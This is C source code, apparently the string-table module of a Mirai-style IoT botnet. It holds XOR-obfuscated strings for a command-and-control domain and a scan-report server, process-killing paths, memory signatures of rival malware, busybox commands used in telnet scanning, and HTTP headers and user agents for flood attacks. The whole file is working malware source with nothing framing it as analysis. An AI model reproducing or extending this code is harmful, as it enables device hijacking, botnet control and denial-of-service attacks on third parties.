#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_DOMAIN, "\x4C\x47\x4F\x51\x41\x4C\x41\x0C\x46\x46\x4C\x51\x0C\x4C\x47\x56\x22", 30); // nemscnc.ddns.net
    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101

    add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);

    // safe string https://youtu.be/dQw4w9WgXcQ
    add_entry(TABLE_KILLER_SAFE, "\x4A\x56\x56\x52\x51\x18\x0D\x0D\x5B\x4D\x57\x56\x57\x0C\x40\x47\x0D\x46\x73\x55\x16\x55\x1B\x75\x45\x7A\x41\x73\x22", 29);
    add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7);
    add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);
    add_entry(TABLE_KILLER_DELETED, "\x02\x0A\x46\x47\x4E\x47\x56\x47\x46\x0B\x22", 11);
    add_entry(TABLE_KILLER_FD, "\x0D\x44\x46\x22", 4);
    add_entry(TABLE_KILLER_ANIME, "\x0C\x43\x4C\x4B\x4F\x47\x22", 7);
    add_entry(TABLE_KILLER_STATUS, "\x0D\x51\x56\x43\x56\x57\x51\x22", 8);
    add_entry(TABLE_MEM_QBOT, "\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22", 13);
    add_entry(TABLE_MEM_QBOT2, "\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22", 10);
    add_entry(TABLE_MEM_QBOT3, "\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22", 10);
    add_entry(TABLE_MEM_UPX, "\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22", 33);
    add_entry(TABLE_MEM_ZOLLARD, "\x58\x4D\x4E\x4E\x43\x50\x46\x22", 8);
    add_entry(TABLE_MEM_REMAITEN, "\x65\x67\x76\x6E\x6D\x61\x63\x6E\x6B\x72\x22", 11);

    add_entry(TABLE_SCAN_SHELL, "\x51\x4A\x47\x4E\x4E\x22", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x47\x4C\x43\x40\x4E\x47\x22", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x51\x5B\x51\x56\x47\x4F\x22", 7);
    add_entry(TABLE_SCAN_SH, "\x51\x4A\x22", 3);
    add_entry(TABLE_SCAN_QUERY, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x6F\x6B\x70\x63\x6B\x22", 19);
    add_entry(TABLE_SCAN_RESP, "\x6F\x6B\x70\x63\x6B\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22", 24);
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9);
    add_entry(TABLE_SCAN_PS, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x52\x51\x22", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x49\x4B\x4E\x4E\x02\x0F\x1B\x02\x22", 22);

    add_entry(TABLE_ATK_VSE, "\x76\x71\x4D\x57\x50\x41\x47\x02\x67\x4C\x45\x4B\x4C\x47\x02\x73\x57\x47\x50\x5B\x22", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);

    add_entry(TABLE_ATK_KEEP_ALIVE, "\x61\x4D\x4C\x4C\x47\x41\x56\x4B\x4D\x4C\x18\x02\x49\x47\x47\x52\x0F\x43\x4E\x4B\x54\x47\x22", 23);
    add_entry(TABLE_ATK_ACCEPT, "\x63\x41\x41\x47\x52\x56\x18\x02\x56\x47\x5A\x56\x0D\x4A\x56\x4F\x4E\x0E\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4A\x56\x4F\x4E\x09\x5A\x4F\x4E\x0E\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4F\x4E\x19\x53\x1F\x12\x0C\x1B\x0E\x4B\x4F\x43\x45\x47\x0D\x55\x47\x40\x52\x0E\x08\x0D\x08\x19\x53\x1F\x12\x0C\x1A\x22", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x63\x41\x41\x47\x52\x56\x0F\x6E\x43\x4C\x45\x57\x43\x45\x47\x18\x02\x47\x4C\x0F\x77\x71\x0E\x47\x4C\x19\x53\x1F\x12\x0C\x1A\x22", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x61\x4D\x4C\x56\x47\x4C\x56\x0F\x76\x5B\x52\x47\x18\x02\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x0F\x55\x55\x55\x0F\x44\x4D\x50\x4F\x0F\x57\x50\x4E\x47\x4C\x41\x4D\x46\x47\x46\x22", 48);
    add_entry(TABLE_ATK_SET_COOKIE, "\x51\x47\x56\x61\x4D\x4D\x49\x4B\x47\x0A\x05\x22", 12);
    add_entry(TABLE_ATK_REFRESH_HDR, "\x50\x47\x44\x50\x47\x51\x4A\x18\x22", 9);
    add_entry(TABLE_ATK_LOCATION_HDR, "\x4E\x4D\x41\x43\x56\x4B\x4D\x4C\x18\x22", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x51\x47\x56\x0F\x41\x4D\x4D\x49\x4B\x47\x18\x22", 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x41\x4D\x4C\x56\x47\x4C\x56\x0F\x4E\x47\x4C\x45\x56\x4A\x18\x22", 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x56\x50\x43\x4C\x51\x44\x47\x50\x0F\x47\x4C\x41\x4D\x46\x4B\x4C\x45\x18\x22", 19);
    add_entry(TABLE_ATK_CHUNKED, "\x41\x4A\x57\x4C\x49\x47\x46\x22", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x49\x47\x47\x52\x0F\x43\x4E\x4B\x54\x47\x22", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x41\x4D\x4C\x4C\x47\x41\x56\x4B\x4D\x4C\x18\x22", 12);
    add_entry(TABLE_ATK_DOSARREST, "\x51\x47\x50\x54\x47\x50\x18\x02\x46\x4D\x51\x43\x50\x50\x47\x51\x56\x22", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x51\x47\x50\x54\x47\x50\x18\x02\x41\x4E\x4D\x57\x46\x44\x4E\x43\x50\x47\x0F\x4C\x45\x4B\x4C\x5A\x22", 25);

    add_entry(TABLE_HTTP_ONE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x13\x0C\x12\x0C\x10\x15\x12\x16\x0C\x13\x12\x11\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22", 111);
    add_entry(TABLE_HTTP_TWO, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x10\x0C\x12\x0C\x10\x15\x16\x11\x0C\x13\x13\x14\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22", 111);
    add_entry(TABLE_HTTP_THREE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x14\x0C\x13\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x13\x0C\x12\x0C\x10\x15\x12\x16\x0C\x13\x12\x11\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22", 110);
    add_entry(TABLE_HTTP_FOUR, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x14\x0C\x13\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x10\x0C\x12\x0C\x10\x15\x16\x11\x0C\x13\x13\x14\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22", 110);
    add_entry(TABLE_HTTP_FIVE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x6F\x43\x41\x4B\x4C\x56\x4D\x51\x4A\x19\x02\x6B\x4C\x56\x47\x4E\x02\x6F\x43\x41\x02\x6D\x71\x02\x7A\x02\x13\x12\x7D\x13\x13\x7D\x14\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x14\x12\x13\x0C\x15\x0C\x15\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x1B\x0C\x13\x0C\x10\x02\x71\x43\x44\x43\x50\x4B\x0D\x14\x12\x13\x0C\x15\x0C\x15\x22", 117);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
